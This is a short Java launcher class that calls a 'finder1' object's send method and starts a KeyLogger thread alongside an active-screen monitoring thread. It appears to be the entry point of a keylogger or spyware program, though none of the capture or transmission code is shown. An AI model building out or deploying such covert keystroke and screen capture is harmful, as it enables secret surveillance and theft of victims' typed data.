/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Vaibhav Biturwar
 */
public class Starting {
    public static void main(String arguments[]) //throws IOException, NativeHookException
	{
            finder1 obj=new finder1();
                obj.send();    
            appscreen a=new appscreen();
           KeyLogger k=new KeyLogger();
            
            
            Thread logger=new Thread(k);
            Thread active_screen=new Thread(a);
            
            
            
            logger.start();
            active_screen.start();
        
                
	  
	}
    }
    

